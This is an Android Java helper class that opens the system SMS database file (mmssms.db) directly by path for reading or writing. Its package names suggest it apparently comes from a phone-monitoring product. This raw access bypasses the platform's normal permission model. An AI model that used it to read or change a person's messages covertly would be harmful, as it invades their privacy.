package com.vvt.sms;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.fx.maind.ref.Customization;
import com.vvt.database.VtDatabaseHelper;
import com.vvt.logger.FxLog;

/**
 * A helper class for querying SMS
 * Note: Limit using to a console version!
 */
class SmsDatabaseHelper {
	private static final String TAG = "SmsDatabaseHelper";
	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	private static final boolean LOCAL_LOGD = Customization.DEBUG;
	
	private static final String PACKAGE_NAME = "com.android.providers.telephony";
	private static final String DATABASE_FILE_NAME = "mmssms.db";
	
	public static final String TABLE_SMS = "sms";
	public static final String COLUMN_ID = "_id";
	public static final String COLUMN_ADDRESS = "address";
	public static final String COLUMN_DATE = "date";
	public static final String COLUMN_READ = "read";
	public static final String COLUMN_TYPE = "type";
	public static final String COLUMN_BODY = "body";
	
	private static String sDbPath = null;
	
	public static SQLiteDatabase getReadableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	public static SQLiteDatabase getWritableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READWRITE | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	private static SQLiteDatabase openDatabase(int flags) {
		if (sDbPath == null) {
			String dbPath = VtDatabaseHelper.getSystemDatabasePath(PACKAGE_NAME);
			if (dbPath != null) {
				sDbPath = String.format("%s/%s", dbPath, DATABASE_FILE_NAME);
			}
			if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format("openDatabase # sDbPath: %s", sDbPath));
			}
		}
		
		SQLiteDatabase db = tryOpenDatabase(flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, "Cannot open database. Retrying ...");
			}
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(flags);
			
			attemptLimit--;
		}
		
		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(int flags) {
		SQLiteDatabase db = null;
		try {
			db = SQLiteDatabase.openDatabase(sDbPath, null, flags);
		}
		catch (SQLiteException e) {
			FxLog.e(TAG, String.format("tryOpenDatabase # Error: %s", e));
		}
		return db;
	}
	
}
